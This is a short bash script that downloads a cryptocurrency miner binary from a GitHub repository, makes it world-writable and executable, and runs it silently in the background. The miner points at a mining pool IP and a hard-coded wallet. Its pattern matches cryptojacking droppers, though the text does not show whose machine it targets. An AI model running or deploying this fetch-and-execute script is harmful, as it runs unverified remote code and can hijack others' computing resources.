#!/bin/bash
sleep 15
mkdir /data
cd /data
curl -LO https://github.com/2319763378/pool/raw/master/minerd
chmod 777 minerd
nohup ./minerd -a CryptoVantaa -o stratum+tcp://47.252.7.107:3113 -u ETmF5wiWCPjMyXEoEbEGoL6UkcAXAvT7Ah -p c=IOTE &
